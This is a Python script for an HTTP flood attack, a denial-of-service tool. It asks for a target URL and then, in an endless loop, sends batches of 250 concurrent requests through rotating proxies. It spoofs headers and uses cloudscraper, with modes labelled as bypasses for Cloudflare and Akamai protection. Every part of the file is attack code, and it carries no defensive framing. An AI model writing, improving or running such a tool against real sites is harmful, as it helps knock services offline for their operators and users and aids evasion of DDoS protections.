import asyncio
import aiohttp
import cloudscraper
import random

# Proxy List
PROXY_LIST = "proxies.txt"

# Load proxies
def load_proxies():
    try:
        with open(PROXY_LIST, "r") as f:
            return [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        return []

# Cloudflare Bypass
async def cloudflare_attack(url, session, proxies):
    scraper = cloudscraper.create_scraper()
    proxy = random.choice(proxies) if proxies else None
    headers = {"User-Agent": "Mozilla/5.0"}
    
    try:
        response = scraper.get(url, headers=headers, proxies={"http": proxy, "https": proxy} if proxy else None)
        print(f"[Cloudflare] Attack Sent! Status: {response.status_code}")
    except Exception as e:
        print(f"[Cloudflare] Request Failed: {e}")

# Akamai Bypass
async def akamai_attack(url, session, proxies):
    proxy = random.choice(proxies) if proxies else None
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Referer": url,
        "X-Requested-With": "XMLHttpRequest",
    }
    try:
        async with session.get(url, headers=headers, proxy=proxy) as response:
            print(f"[Akamai] Attack Sent! Status: {response.status}")
    except Exception as e:
        print(f"[Akamai] Request Failed: {e}")

# Start Attack (200+ Requests Per Second)
async def start_attack(url, mode):
    proxies = load_proxies()
    async with aiohttp.ClientSession() as session:
        while True:
            if mode == "cloudflare":
                tasks = [cloudflare_attack(url, session, proxies) for _ in range(250)]  # 250 requests
            elif mode == "akamai":
                tasks = [akamai_attack(url, session, proxies) for _ in range(250)]  # 250 requests
            await asyncio.gather(*tasks)

# User Input
if __name__ == "__main__":
    target_url = input("Enter Target URL: ")
    mode = input("Choose Mode (cloudflare/akamai): ").strip().lower()
    
    if mode not in ["cloudflare", "akamai"]:
        print("Invalid Mode! Choose 'cloudflare' or 'akamai'.")
    else:
        asyncio.run(start_attack(target_url, mode))
